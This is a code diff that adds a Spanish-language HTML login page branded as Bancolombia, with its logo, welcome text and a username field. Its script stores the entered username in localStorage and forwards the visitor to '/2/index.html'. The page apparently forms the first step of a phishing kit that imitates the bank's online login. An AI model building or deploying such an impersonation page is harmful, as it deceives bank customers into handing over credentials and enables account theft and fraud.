@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Bancolombia - Inicio</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Header con logo centrado -->
+  <header>
+    <img src="logo.svg" alt="Bancolombia Logo" class="logo">
+  </header>
+  
+  <!-- Contenedor que agrupa el título y el cuadro de ingreso -->
+  <div class="content">
+    <!-- Título de bienvenida (fuera del cuadro) -->
+    <h2 class="welcome-title">Te damos la bienvenida</h2>
+    
+    <!-- Cuadro blanco para ingreso (más pequeño) -->
+    <div class="login-container">
+      <p class="subtitle">El usuario es el mismo con el que ingresan a <br><b>Sucursal Virtual Personas.</b></p>
+
+      <!-- Grupo de entrada minimalista -->
+      <div class="input-group">
+        <img src="usuario.png" alt="Icono Usuario" class="input-icon">
+        <input type="text" id="user-input" placeholder="Usuario">
+      </div>
+
+      <!-- Enlace "Olvidaste tu contraseña?" alineado a la derecha -->
+      <div class="forgot-container">
+        <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
+      </div>
+    
+
+      <!-- Botones de acción -->
+      <div class="buttons-row">
+        <button class="btn-back">Volver</button>
+        <button class="btn-login" onclick="saveUserAndContinue()">Continuar</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    function saveUserAndContinue() {
+  const user = document.getElementById('user-input').value;
+  localStorage.setItem('user', user);
+  location.href = '/2/index.html';
+    }
+  </script>
+</body>
+</html>
